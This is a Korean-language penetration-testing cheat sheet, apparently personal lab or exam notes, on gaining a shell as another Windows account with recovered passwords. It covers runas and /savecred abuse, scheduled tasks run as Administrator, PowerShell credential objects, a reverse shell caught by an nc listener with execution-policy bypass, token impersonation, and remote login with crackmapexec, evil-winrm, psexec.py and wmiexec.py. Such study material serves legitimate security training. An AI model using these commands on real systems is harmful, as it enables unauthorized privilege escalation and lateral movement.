# 사용자 전환 — runas / 자격증명 실행 (Windows)

한 줄 요약: 열거로 확보한 패스워드로 다른 계정(RID 500 등) 컨텍스트의 쉘을 얻는 기법.
쉘 종류가 갈림길이다. 콘솔/RDP(창 있음) → runas로 끝. WinRM·리버스 쉘(창 없음) → 파일 출력 또는 콜백.

> 관련 문서: [Windows 권한 치트시트](./windows_privileges.md) · [evil-winrm](./evil-winrm.md)

## 사전 확인

```cmd
whoami
cmdkey /list
```

- winPEAS 사용자 정보에서 RID 500이면 내장 Administrator. 패스워드 후보가 나오면 이 계정부터 시도.
- `cmdkey /list`에 저장된 크리덜이 보이면 `/savecred` 남용이 바로 가능.

## 콘솔/RDP(창 있는 세션)면: runas

```cmd
runas /user:Administrator cmd.exe
```

- 플래그는 `/user:`다. `/usr:`은 없는 옵션이라 usage만 출력된다.
- 패스워드는 콘솔에서 직접 입력받는다. 파이프·리다이렉션 전달 불가.
- 성공 판정: `RUNAS ERROR`가 안 붙고 `Attempting to start cmd as user ...` 뒤로 프롬프트가 돌아오면 로그온·프로세스 생성 모두 성공. 새 cmd 창이 열린다.
- 로컬 계정 명시: `runas /user:.\Administrator cmd.exe`
- 플래그: `/profile`(프로필 로드, 기본), `/env`(현재 환경 유지), `/netonly`(도메인 크리덜 원격 전용)

### 저장된 크리덜로 패스워드 없이 실행

```cmd
runas /savecred /user:USER "cmd.exe /c whoami > C:\temp\out.txt"
```

## 창 없는 세션(WinRM·evil-winrm·리버스 쉘)이면

runas는 프로세스를 별도 콘솔로 띄우는데, 세션에 데스크톱이 없으면 붙일 곳이 없다.
실행은 되지만 눈에 안 보이고 입력·출력이 안 이어진다. 세션 안에서 프롬프트만 바뀌는 전환은 불가능하다고 보면 된다.

### 방법 1 — 출력을 파일로 빼서 읽기 (파일 확인이 목적일 때)

```cmd
runas /user:Administrator "cmd.exe /c dir C:\Users\Administrator\Desktop > C:\Users\Jeff\out.txt 2>&1"
type C:\Users\Jeff\out.txt
```

### 방법 2 — schtasks (서비스 계정 쉘이면 이게 제일 확실)

```cmd
schtasks /create /f /tn t1 /tr "cmd /c whoami > C:\Users\Jeff\out.txt" /sc once /st 23:59 /ru Administrator /rp PASSWORD
schtasks /run /tn t1
type C:\Users\Jeff\out.txt
schtasks /delete /f /tn t1
```

- `/ru` 실행 계정, `/rp` 그 계정의 패스워드. `/tr` 안에서 리다이렉션이 필요하면 `cmd /c`로 감싼다.

### 방법 3 — PowerShell 자격증명 객체

```powershell
$pass = ConvertTo-SecureString 'PASSWORD' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('.\Administrator', $pass)
Start-Process -FilePath 'cmd.exe' -Credential $cred
```

- 새 창을 필요로 해서 콘솔/RDP에서만 안정적. 창 없는 세션에선 방법 1·2로.

### 방법 4 — 대화형 쉘이 필요하면 콜백으로 받는다

WinRM 세션 안에서 프롬프트가 바뀌는 전환은 불가능하니, 대상 계정 컨텍스트로 리버스 쉘을 띄워 Kali 리스너로 받는다.

1. Kali에서 리스너: `rlwrap nc -lvnp 4444`
2. 리버스 쉘 스크립트(rev.ps1)를 대상에 업로드
3. 실행:

```cmd
runas /user:Administrator "cmd.exe /c powershell -ep bypass -File C:\Users\Jeff\rev.ps1"
```

```cmd
schtasks /create /f /tn t1 /tr "powershell -ep bypass -File C:\Users\Jeff\rev.ps1" /sc once /st 23:59 /ru Administrator /rp PASSWORD
schtasks /run /tn t1
```

- 리스너에 떨어진 쉘에서 `whoami`로 전환 확인.
- meterpreter 세션이면 토큰 스왑이 가능하다: `load incognito` 후 `impersonate_token HOST\Administrator`

## 이미 High Integrity(관리자)면 패스워드 리셋도 방법

```cmd
net user Administrator NewPass123!
```

- 흔적이 남고 기존 세션·인증을 깨뜨릴 수 있어 최후 수단.

## 패스워드가 유효하면 쉘 전환보다 원격 접속이 최단일 때 (Kali)

```bash
crackmapexec smb 192.168.80.200 -u Administrator -p 'PASSWORD'   # (Possible)Pwn3d! 확인
evil-winrm -i 192.168.80.200 -u Administrator -p 'PASSWORD'
psexec.py Administrator:'PASSWORD'@192.168.80.200
wmiexec.py Administrator:'PASSWORD'@192.168.80.200
xfreerdp /u:Administrator /p:'PASSWORD' /v:192.168.80.200 /dynamic-resolution
```

- 같은 계정이라 경로(RDP·WinRM·SMB·WMI)마다 성공 여부가 다르다. 여러 개를 돌려본다.

## 흔한 실패와 원인

- 프롬프트 없이 멈춤: 비대화형 쉘에서 runas 시도. 방법 1~4로 전환.
- 프롬프트가 돌아왔는데 새 창이 안 보임: 창 없는 세션. 방법 1~4로.
- `Logon failure: unknown user name or bad password`: 계정명·도메인 확인. 로컬 계정이면 `.\`를 붙여본다.
- `The directory name is invalid`: 해당 사용자의 프로필 디렉터리 없음. schtasks·Start-Process로 우회.
- 원격 로그온한 로컬 관리자인데 권한이 낮게 보임: UAC 원격 토큰 필터링(RID 500은 기본 예외). 콘솔·schtasks 경로로 우회.
